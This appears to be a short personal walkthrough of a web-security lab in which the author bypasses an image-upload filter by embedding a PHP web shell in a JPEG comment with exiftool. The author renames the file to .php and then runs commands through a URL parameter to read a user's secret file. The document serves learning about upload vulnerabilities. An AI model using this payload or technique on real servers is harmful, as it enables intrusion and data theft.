@@ -1,0 +1,5 @@
+Remote code execution via polyglot web shell upload
+
+so here file upload is a bit strinct and the usual way of uploading a php file or some obfuscated one doesnt work here. what works is uploading a polyglot. so since jpeg is allowed i used a jpeg and inserted a php executable into it using 
+exiftool -Comment='<?php echo system($_GET["command"]); ?>' original.jpg -o polyglot.jpg
+now when i do strings pologlot.jpg pipe grep php i can see the code. now that i can bypass the uploading part to execute i need to reoute to a php file like i cant do a get req to /files/avatars/polyglot.jpeg and expect it to execute the php. it only displays the image. So i renamed it to polyglot.php, checked again if the code is in there, it was, then uploaded that. Now when i navigate to ... /files/avatars/polyglot.php?command eq id, i can see its working. i used ... /files/avatars/polyglot.php?command eq cat /home/carlos.secret to get the secret
